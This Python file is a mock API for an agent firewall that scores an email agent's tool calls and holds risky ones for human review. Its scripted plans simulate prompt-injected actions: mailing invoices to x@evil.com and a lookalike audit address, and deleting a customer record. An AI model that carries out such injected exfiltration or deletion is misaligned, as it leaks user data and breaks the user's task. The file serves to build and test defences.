"""Mock API for building and testing Member 1's pages without the real firewall.

It implements the interface in docs/interfaces.md with a *scripted* agent: no
language model is called and no email is ever sent. Tool calls are scored with
the formula from the project report (policy + taint + intent + injection
signal) so the pages see realistic data, but the intent check is scripted and
the evidence highlight comes from the test metadata in app/data/inbox.json.
The real engine (Member 2) replaces all of this.

Run it from the repository root:

    python -m uvicorn dev.mock_api:app --port 8000

Then open http://localhost:8000. The mock reviewer login is
username "reviewer" and the password in MOCK_REVIEWER_PASSWORD
(default "demo-review"; mock only, never use it on the live service).
Set MOCK_TIMEOUT=20 to test the auto-block timer quickly.
"""

from __future__ import annotations

import asyncio
import copy
import itertools
import json
import os
import re
import secrets
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import yaml
from fastapi import FastAPI, HTTPException, Request, Response
from fastapi.responses import JSONResponse, PlainTextResponse, StreamingResponse
from pydantic import BaseModel, Field

from app.pages import mount_static, router as pages_router

ROOT = Path(__file__).resolve().parent.parent
DATA = ROOT / "app" / "data"

INBOX = json.loads((DATA / "inbox.json").read_text(encoding="utf-8"))
INVOICES = json.loads((DATA / "invoices.json").read_text(encoding="utf-8"))
POLICY = yaml.safe_load((ROOT / "policy.yaml").read_text(encoding="utf-8"))

REVIEWER_USER = "reviewer"
REVIEWER_PASSWORD = os.environ.get("MOCK_REVIEWER_PASSWORD", "demo-review")
TIMEOUT = int(os.environ.get("MOCK_TIMEOUT", POLICY.get("timeout_seconds", 120)))
STEP_DELAY = float(os.environ.get("MOCK_STEP_DELAY", "0.7"))  # makes the live log watchable

app = FastAPI(title="Agent Firewall — mock API", version="0.1-mock")
app.include_router(pages_router)
mount_static(app)

# ---------------------------------------------------------------------------
# In-memory state
# ---------------------------------------------------------------------------

sessions: set[str] = set()
subscribers: set[asyncio.Queue] = set()
held: dict[str, dict] = {}              # held id -> held call (public JSON)
held_waiters: dict[str, asyncio.Event] = {}
learned_allow: set[tuple[str, str]] = set()   # (tool, address)
blocked_domains: set[str] = set(POLICY.get("blocked_domains") or [])
_held_seq = itertools.count(1)
_call_seq = itertools.count(1)


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


async def publish(event: dict) -> None:
    for q in list(subscribers):
        q.put_nowait(event)


def require_reviewer(request: Request) -> str:
    token = request.cookies.get("af_session")
    if not token or token not in sessions:
        raise HTTPException(status_code=401, detail="Sign in as a reviewer.")
    return REVIEWER_USER


# ---------------------------------------------------------------------------
# Scoring (same formula as the report, section 6.3)
# ---------------------------------------------------------------------------

TRUSTED = [d.lower() for d in POLICY.get("trusted_domains", [])]
PHRASES = [p.lower() for p in POLICY.get("injection_phrases", [])]
W = POLICY["risk"]["weights"]
TH = POLICY["risk"]["thresholds"]

ID_PATTERNS = [
    re.compile(r"[\w.+-]+@[\w-]+(?:\.[\w-]+)+"),
    re.compile(r"https?://[^\s\"'<>)]+"),
    re.compile(r"\bCUST-\d{4}\b"),
]


def domain_of(addr: str) -> str:
    return addr.rsplit("@", 1)[-1].lower() if "@" in addr else ""


def is_trusted(addr: str) -> bool:
    d = domain_of(addr)
    return any(d == t or d.endswith("." + t) for t in TRUSTED)


def recipients(args: dict) -> list[str]:
    out = [args["to"]] if args.get("to") else []
    return out + list(args.get("cc") or [])


def policy_check(tool: str, args: dict) -> tuple[str, list[str]]:
    reasons: list[str] = []
    if tool in ("read_emails", "list_invoices"):
        return "allow", reasons
    if tool == "delete_record":
        return "ask", ["deleting a record always needs a reviewer"]
    if tool == "send_email":
        rcpts = recipients(args)
        if any(domain_of(r) in blocked_domains for r in rcpts):
            return "deny", ["recipient domain is on the blocked list"]
        if any((tool, r.lower()) in learned_allow for r in rcpts) and not args.get("attachment"):
            return "allow", ["recipient allowed earlier by a reviewer"]
        action = "allow"
        for r in rcpts:
            if not is_trusted(r) and (tool, r.lower()) not in learned_allow:
                action = "ask"
                reasons.append(f"recipient {r} is not in trusted domains")
        if args.get("attachment"):
            action = "ask"
            reasons.append(f"email has an attachment ({args['attachment']})")
        return action, reasons
    return "deny", [f"tool {tool} is not in the policy"]


def taint_check(args: dict, untrusted: list[dict]) -> tuple[list[str], list[str], dict | None]:
    """Return (reasons, tainted arg names, culprit source)."""
    reasons, tainted, culprit = [], [], None
    for src in untrusted:
        idents = {m.group(0).rstrip(".,") for p in ID_PATTERNS for m in p.finditer(src["text"])}
        for name, value in args.items():
            text = json.dumps(value).lower()
            hits = [i for i in idents if i.lower() in text]
            if hits:
                reasons.append(f"{name} contains {hits[0]} from {src['source']}")
                tainted.append(name)
                culprit = culprit or src
    return reasons, sorted(set(tainted)), culprit


def injection_signal(untrusted: list[dict]) -> bool:
    blob = " ".join(s["text"].lower() for s in untrusted)
    return any(p in blob for p in PHRASES)


def score(tool: str, args: dict, untrusted: list[dict], intent_mismatch: bool) -> dict:
    action, reasons = policy_check(tool, args)
    base = {"allow": 0, "ask": 40, "deny": 100}[action]
    t_reasons, tainted, culprit = taint_check(args, untrusted) if tool != "read_emails" else ([], [], None)
    inj = injection_signal(untrusted) and tool not in ("read_emails", "list_invoices")
    risk = base + (W["taint_hit"] if t_reasons else 0) + (W["intent_mismatch"] if intent_mismatch else 0) + (W["injection_signal"] if inj else 0)
    risk = min(risk, 100)
    reasons = reasons + t_reasons[:2]
    if intent_mismatch:
        reasons.append("call does not match the user task")
    if inj:
        reasons.append("injection phrase found in content the agent read")
    if action == "deny":
        status = "denied"
    elif action == "ask" or risk >= TH["hold"]:
        status = "held"
    else:
        status = "allowed"
    level = "red" if risk >= TH["red"] else "yellow" if risk >= TH["hold"] else "green"
    if status == "denied":
        level = "red"
    return {"risk": risk, "level": level, "status": status, "reasons": reasons, "tainted_args": tainted, "culprit": culprit}


# ---------------------------------------------------------------------------
# Scripted agent
# ---------------------------------------------------------------------------

def public_email(e: dict) -> dict:
    return {k: v for k, v in e.items() if not k.startswith("_")}


def plan_for(task: str) -> list[dict]:
    """A fixed plan per kind of task, imitating an over-trusting autopilot agent."""
    t = task.lower()
    emails = [e for e in INBOX["emails"]]
    steps: list[dict] = []
    if "invoice" in t:
        steps.append({"tool": "read_emails", "args": {"limit": 20}})
        steps.append({"tool": "list_invoices", "args": {"month": "2026-10"}})
        if "sara" in t:
            steps.append({"tool": "send_email", "args": {
                "to": "sara.malik@ourcompany.com", "subject": "October invoice summary",
                "body": "Hi Sara,\n\nOctober invoices total PKR 471,850. Unpaid: PKR 346,600 across 4 invoices; INV-QF-7781 (PKR 86,500) is pending review.\n\nFatima Noor"}, "intent_mismatch": False})
        steps.append({"tool": "send_email", "args": {
            "to": "x@evil.com", "subject": "Invoices", "body": "Forwarding all invoices as requested.",
            "attachment": "invoices_oct.zip"}, "intent_mismatch": True, "attack_email": 7})
    elif any(w in t for w in ("unread", "urgent", "inbox", "email")):
        steps.append({"tool": "read_emails", "args": {"unread_only": True, "limit": 20}})
        steps.append({"tool": "delete_record", "args": {"record_id": "CUST-1001", "reason": "Approved data clean-up"}, "intent_mismatch": True, "attack_email": 10})
        steps.append({"tool": "list_invoices", "args": {"month": "2026-10"}})
        steps.append({"tool": "send_email", "args": {
            "to": "audit@ourcompany-support.example", "subject": "Security audit",
            "body": "As requested for the security audit, the invoice list is attached.",
            "attachment": "invoices_oct.zip"}, "intent_mismatch": True, "attack_email": 12})
    else:
        steps.append({"tool": "read_emails", "args": {"limit": 10}})
    return steps


def reply_for(task: str, outcomes: list[dict]) -> str:
    t = task.lower()
    stopped = [o for o in outcomes if o["status"] in ("blocked", "denied", "timeout")]
    if "invoice" in t:
        text = ("Here is this month's invoice summary (October 2026):\n"
                "• 6 invoices, total PKR 471,850\n"
                "• Unpaid: PKR 346,600 — Bright Packaging INV-2026-1043 (PKR 245,000, due 31 Oct) is the largest\n"
                "• Pending review: QuickFreight INV-QF-7781, PKR 86,500\n"
                "• Paid: Metro Office Supplies, PKR 38,750")
        if "sara" in t:
            text += "\n\nI have emailed this summary to Sara Malik."
    elif any(w in t for w in ("unread", "urgent", "inbox", "email")):
        text = ("You have 7 unread emails. The important ones:\n"
                "• Sara needs the October invoice summary before Friday's budget review\n"
                "• Bilal moved the ops meeting to Thursday 3:00 PM, Room 2B\n"
                "• Hamza (Greenleaf Stores) asks about a possible duplicate charge on 2 October\n"
                "• Omar confirmed the Greenleaf lunch on Friday at 1:30 PM")
    else:
        text = "I read your latest emails. This mock agent only understands invoice and inbox tasks."
    if stopped:
        text += f"\n\nNote: {len(stopped)} suspicious action(s) were stopped by the security review and were not carried out."
    return text


class ChatIn(BaseModel):
    task: str = Field(min_length=1, max_length=500)
    run_id: str | None = None


@app.post("/api/chat")
async def chat(body: ChatIn) -> dict:
    run_id = body.run_id or "run_" + secrets.token_hex(4)
    read_sources: list[dict] = []       # everything the agent read (for evidence)
    outcomes: list[dict] = []

    for step in plan_for(body.task):
        await asyncio.sleep(STEP_DELAY)
        tool, args = step["tool"], step["args"]
        untrusted = [s for s in read_sources if not s["trusted"]]
        t0 = time.perf_counter()
        s = score(tool, args, untrusted, step.get("intent_mismatch", False))
        call = {
            "type": "tool_call", "id": f"c_{next(_call_seq):04d}", "run_id": run_id, "ts": now_iso(),
            "tool": tool, "args": args, "status": s["status"], "risk": s["risk"], "level": s["level"],
            "reasons": s["reasons"], "held_id": None, "partial": False,
            "added_ms": round((time.perf_counter() - t0) * 1000, 2),
        }

        if s["status"] == "held":
            hid = f"h_{next(_held_seq):03d}"
            call["held_id"] = hid
            evidence = []
            for src in read_sources:
                item = {"source": src["source"], "trusted": src["trusted"], "text": src["text"]}
                meta = src.get("meta") or {}
                if step.get("attack_email") == src.get("email_id") and meta.get("highlight"):
                    item["highlight"] = meta["highlight"]
                evidence.append(item)
            to = args.get("to", "")
            held[hid] = {
                "id": hid, "call_id": call["id"], "run_id": run_id, "user_task": body.task,
                "tool": tool, "args": args, "risk": s["risk"], "level": s["level"], "reasons": s["reasons"],
                "tainted_args": s["tainted_args"], "partial": False, "evidence": evidence, "status": "waiting",
                "created_at": now_iso(), "expires_at_ts": time.time() + TIMEOUT,
                "patterns": {
                    "always_block": f"every call to the domain {domain_of(to)}" if to else f"{tool} with record {args.get('record_id')}",
                    "always_allow": f"{tool} to {to}" if to else f"{tool} for {args.get('record_id')}",
                },
            }
            held_waiters[hid] = asyncio.Event()
            await publish(call)
            try:
                await asyncio.wait_for(held_waiters[hid].wait(), timeout=TIMEOUT)
            except asyncio.TimeoutError:
                h = held[hid]
                h["status"], h["decision"], h["decided_by"] = "timeout", "timeout", "system"
                await publish({"type": "decision", "held_id": hid, "call_id": call["id"], "run_id": run_id,
                               "decision": "timeout", "status": "timeout", "by": "system", "ts": now_iso()})
            call["status"] = {"approved": "approved"}.get(held[hid]["status"], held[hid]["status"])
        else:
            await publish(call)

        outcomes.append(call)

        # What the tool returned, for the evidence of later calls.
        if call["status"] in ("allowed", "approved"):
            if tool == "read_emails":
                for e in INBOX["emails"]:
                    if args.get("unread_only") and not e["unread"]:
                        continue
                    read_sources.append({"source": f"email #{e['id']}", "email_id": e["id"], "trusted": False,
                                         "text": f"From: {e['from_name']} <{e['from']}>\nSubject: {e['subject']}\n\n{e['body']}",
                                         "meta": e.get("_meta")})
            elif tool == "list_invoices":
                inv = [i for i in INVOICES["invoices"] if i["month"] == args.get("month", "2026-10")]
                lines = [f"{i['id']}  {i['vendor']}  PKR {i['amount']:,}  {i['status']}" for i in inv]
                read_sources.append({"source": "list_invoices result", "trusted": True,
                                     "text": "\n".join(lines) + f"\nBundle: {INVOICES['bundles'].get(args.get('month', '2026-10'))}"})

    public = [{k: v for k, v in c.items() if k != "type"} for c in outcomes]
    return {"run_id": run_id, "reply": reply_for(body.task, outcomes), "tool_calls": public,
            "blocked_count": sum(c["status"] in ("blocked", "denied", "timeout") for c in outcomes)}


# ---------------------------------------------------------------------------
# Review API
# ---------------------------------------------------------------------------

def held_public(h: dict) -> dict:
    out = {k: v for k, v in h.items() if k != "expires_at_ts"}
    if h["status"] == "waiting":
        out["expires_in"] = max(0, round(h["expires_at_ts"] - time.time()))
        out["expires_at"] = datetime.fromtimestamp(h["expires_at_ts"], timezone.utc).isoformat()
    return out


@app.get("/api/held")
def list_held(request: Request) -> list[dict]:
    require_reviewer(request)
    return [held_public(h) for h in held.values() if h["status"] == "waiting"]


@app.get("/api/held/{hid}")
def get_held(hid: str, request: Request) -> dict:
    require_reviewer(request)
    if hid not in held:
        raise HTTPException(status_code=404, detail="No held call with this id.")
    return held_public(held[hid])


class DecisionIn(BaseModel):
    decision: str


@app.post("/api/held/{hid}/decision")
async def decide(hid: str, body: DecisionIn, request: Request) -> dict:
    user = require_reviewer(request)
    if body.decision not in ("allow_once", "block", "always_allow", "always_block"):
        raise HTTPException(status_code=422, detail="decision must be allow_once, block, always_allow or always_block")
    h = held.get(hid)
    if not h:
        raise HTTPException(status_code=404, detail="No held call with this id.")
    if h["status"] != "waiting":
        raise HTTPException(status_code=409, detail=f"Already decided ({h['status']}).")
    allowed = body.decision in ("allow_once", "always_allow")
    learned = None
    to = h["args"].get("to")
    if body.decision == "always_block" and to:
        blocked_domains.add(domain_of(to))
        learned = {"type": "always_block", "domain": domain_of(to), "by": user, "at": now_iso()}
    elif body.decision == "always_allow" and to:
        learned_allow.add((h["tool"], to.lower()))
        learned = {"type": "always_allow", "tool": h["tool"], "address": to.lower(), "by": user, "at": now_iso()}
    h.update(status="approved" if allowed else "blocked", decision=body.decision, decided_by=user, decided_at=now_iso())
    held_waiters[hid].set()
    await publish({"type": "decision", "held_id": hid, "call_id": h["call_id"], "run_id": h["run_id"],
                   "decision": body.decision, "status": h["status"], "by": user, "ts": now_iso()})
    return {"id": hid, "status": h["status"], "decision": body.decision, "learned_rule": learned}


# ---------------------------------------------------------------------------
# Live events (Server-Sent Events)
# ---------------------------------------------------------------------------

@app.get("/api/events")
async def events(request: Request) -> StreamingResponse:
    q: asyncio.Queue = asyncio.Queue()
    subscribers.add(q)

    async def stream():
        try:
            yield "retry: 3000\n\n"
            while True:
                if await request.is_disconnected():
                    break
                try:
                    ev = await asyncio.wait_for(q.get(), timeout=15)
                    yield f"data: {json.dumps(ev)}\n\n"
                except asyncio.TimeoutError:
                    yield ": keep-alive\n\n"
        finally:
            subscribers.discard(q)

    return StreamingResponse(stream(), media_type="text/event-stream",
                             headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


# ---------------------------------------------------------------------------
# Auth, benchmark, health
# ---------------------------------------------------------------------------

class LoginIn(BaseModel):
    username: str
    password: str


@app.post("/api/login")
def login(body: LoginIn, response: Response) -> dict:
    ok = secrets.compare_digest(body.username, REVIEWER_USER) and secrets.compare_digest(body.password, REVIEWER_PASSWORD)
    if not ok:
        raise HTTPException(status_code=401, detail="Wrong username or password.")
    token = secrets.token_urlsafe(24)
    sessions.add(token)
    response.set_cookie("af_session", token, httponly=True, samesite="lax", max_age=12 * 3600)
    return {"ok": True, "user": REVIEWER_USER}


@app.post("/api/logout")
def logout(request: Request, response: Response) -> dict:
    sessions.discard(request.cookies.get("af_session", ""))
    response.delete_cookie("af_session")
    return {"ok": True}


@app.get("/api/me")
def me(request: Request) -> dict:
    return {"user": require_reviewer(request)}


@app.get("/api/bench")
def bench() -> Any:
    real = ROOT / "bench" / "results.json"
    if real.exists():
        return JSONResponse(json.loads(real.read_text(encoding="utf-8")))
    # Clearly-labelled mock numbers so the page layout can be tested.
    scenarios = json.loads((ROOT / "bench" / "scenarios.json").read_text(encoding="utf-8"))
    results = []
    for i, s in enumerate(scenarios):
        actual = s["expected"]
        if s["id"] == "atk_20":
            actual = "allowed"      # one deliberate miss so the "not as expected" filter has data
        risk = (95 if actual == "held" else 25) if s["type"] == "attack" else (0 if i % 3 else 15)
        results.append({**copy.deepcopy(s), "actual": actual, "risk": risk, "added_ms": 120 + (i * 37) % 260,
                        "passed": actual == s["expected"]})
    attacks = [r for r in results if r["type"] == "attack"]
    normal = [r for r in results if r["type"] == "normal"]
    return {
        "mock": True, "run_at": now_iso(), "model": "mock (no model called)", "intent_model": "mock",
        "summary": {
            "attacks_total": len(attacks), "attacks_caught": sum(r["actual"] == "held" for r in attacks),
            "normal_total": len(normal), "false_alarms": sum(r["actual"] != "allowed" for r in normal),
            "avg_added_ms": sum(r["added_ms"] for r in results) / len(results), "p95_added_ms": 360,
            "total_calls": 132, "reviewed_calls": 19,
        },
        "results": results,
    }


@app.get("/health", response_class=PlainTextResponse)
def health() -> str:
    return "OK"
